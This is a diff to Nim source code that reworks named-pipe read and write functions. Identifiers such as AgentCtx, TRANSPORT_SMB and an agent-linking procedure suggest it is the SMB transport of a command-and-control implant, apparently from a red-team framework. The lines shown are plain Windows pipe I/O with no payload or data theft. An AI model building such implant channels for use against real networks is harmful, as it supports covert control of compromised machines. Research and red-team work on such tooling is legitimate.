@@ -30,24 +30,34 @@ proc pipeRead*(hPipe: HANDLE, size: DWORD): seq[byte] =
             if GetLastError() != ERROR_MORE_DATA:
                 return @[]
         dwTotal += dwBytesRead
-    
-proc pipeRead*(hPipe: HANDLE): seq[byte] = 
+
+proc smbRead*(ctx: AgentCtx, hPipe: HANDLE): string = 
     var 
         dwSize: DWORD = 0
-        dwBytesRead: DWORD = 0
-        dwTotal: DWORD = 0
-    
+        temp: seq[byte] = @[]
+        data: seq[byte] = @[]
+
     if PeekNamedPipe(hPipe, NULL, 0, NULL, addr dwSize, NULL) == FALSE:
-        return @[]
+        when defined(TRANSPORT_SMB):
+            ctx.registered = false
+            DisconnectNamedPipe(ctx.transport.hPipe)
+            CloseHandle(ctx.transport.hPipe)
+            ctx.transport.hPipe = 0
+        return ""
 
-    if dwSize > 0: 
-        result = newSeq[byte](dwSize)
-        while dwTotal < dwSize:            
-            if ReadFile(hPipe, cast[LPVOID](addr result[dwTotal]), min(dwSize - dwTotal, PIPE_BUFFER_MAX), addr dwBytesRead, NULL) == FALSE:
-                if GetLastError() != ERROR_MORE_DATA:
-                    return @[]
-            dwTotal += dwBytesRead
+    # Read data until pipe is empty (for messages that exceed the size limit of the named pipe)
+    while dwSize > 0:
+        temp = hPipe.pipeRead(dwSize)
+        if temp.len() == 0:
+            return Bytes.toString(data)
+        data.add(temp)
+        
+        if PeekNamedPipe(hPipe, NULL, 0, NULL, addr dwSize, NULL) == FALSE:
+            break
+    
+    return Bytes.toString(data)
 
+# Agent linking
 proc link*(ctx: AgentCtx, pipeName: string): seq[byte] =   
     var 
         hPipe: HANDLE = 0
@@ -151,32 +161,11 @@ when defined(TRANSPORT_SMB):
             return ctx.transport.hPipe.pipeWrite(data)
         
         # Pipe was already created, write data to the pipe
-        try:
-            return ctx.transport.hPipe.pipeWrite(data)
-        
-        except CatchableError:
+        if not ctx.transport.hPipe.pipeWrite(data):
             let err = GetLastError()
-            if err == ERROR_NO_DATA or err == ERROR_BROKEN_PIPE:
+            if err == ERROR_NO_DATA:
                 CloseHandle(ctx.transport.hPipe)
                 ctx.transport.hPipe = 0
                 return false
-    
-    proc smbRead*(ctx: AgentCtx): string = 
-        var 
-            dwSize: DWORD = 0
-            data: seq[byte]
-
-        if PeekNamedPipe(ctx.transport.hPipe, NULL, 0, NULL, addr dwSize, NULL) == FALSE:
-            ctx.registered = false
-
-            # Disconnect
-            DisconnectNamedPipe(ctx.transport.hPipe)
-            CloseHandle(ctx.transport.hPipe)
-            ctx.transport.hPipe = 0
-            
-            return ""
-
-        if dwSize > 0: 
-            data = ctx.transport.hPipe.pipeRead(dwSize)
-            return Bytes.toString(data)
         
+        return true
